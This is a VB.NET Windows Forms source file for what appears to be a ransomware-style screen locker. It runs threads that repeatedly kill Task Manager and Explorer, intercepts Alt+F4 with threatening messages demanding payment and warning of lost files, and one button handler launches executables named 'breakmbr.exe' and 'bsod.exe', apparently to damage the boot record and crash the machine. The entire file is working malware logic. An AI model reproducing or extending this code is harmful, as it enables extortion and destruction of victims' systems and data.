﻿

Public Class Form2

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load


        Dim t As New Threading.Thread(AddressOf block)
        t.Start()
        Dim t2 As New Threading.Thread(AddressOf block2)
        t2.Start()

        Label1.Left = (Label1.Parent.Width / 2) - (Label1.Width / 2)

        Label2.Top = (Label2.Parent.Height / 2) - 200
        Label3.Top = (Label2.Parent.Height / 2) + 10
        Label4.Top = (Label2.Parent.Height / 2) + 50
        TextBox1.Top = (Label2.Parent.Height / 2) + 70

        Label5.Top = (Label2.Parent.Height / 2) + 100
        Button1.Top = (Label2.Parent.Height / 2) + 68
        Button1.Left = (Label2.Width / 2) + 50
    End Sub
    Sub block()
        While True
            For Each p As Process In Process.GetProcessesByName("taskmgr")
                p.Kill()
            Next
        End While
    End Sub
    Sub block2()
        While True
            For Each p As Process In Process.GetProcessesByName("explorer")
                p.Kill()

            Next
            Threading.Thread.Sleep(100)
        End While
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If TextBox1.Text = "" Then
            Me.Close()
            Form3.Show()
        Else
            MessageBox.Show("Wrong Key" + Environment.NewLine + "Stop to being smart" + Environment.NewLine + "Pay me Money", "Wrong Key", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub


    Private Sub Button1_KeyDown(sender As Object, e As KeyEventArgs) Handles Button1.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("You Can't Close me" + Environment.NewLine + "If you Close me  you will loose all Your Files" + Environment.NewLine + "So don't be Smart just Pay Money", "You are Fucked", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            e.Handled = True
        End If
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("You Can't Close me" + Environment.NewLine + "If you Close me  you will loose all Your Files" + Environment.NewLine + "So don't be Smart just Pay Money", "You are Fucked", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            e.Handled = True
        End If
    End Sub

    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged

    End Sub

    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click, Button3.Click
        MsgBox("我只是一个按钮")
        MsgBox("点我干嘛")
        MsgBox("口亨")
        MsgBox("自己想办法去")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.ClientSizeChanged
        Shell("breakmbr.exe")
        Shell("bsod.exe")
    End Sub
End Class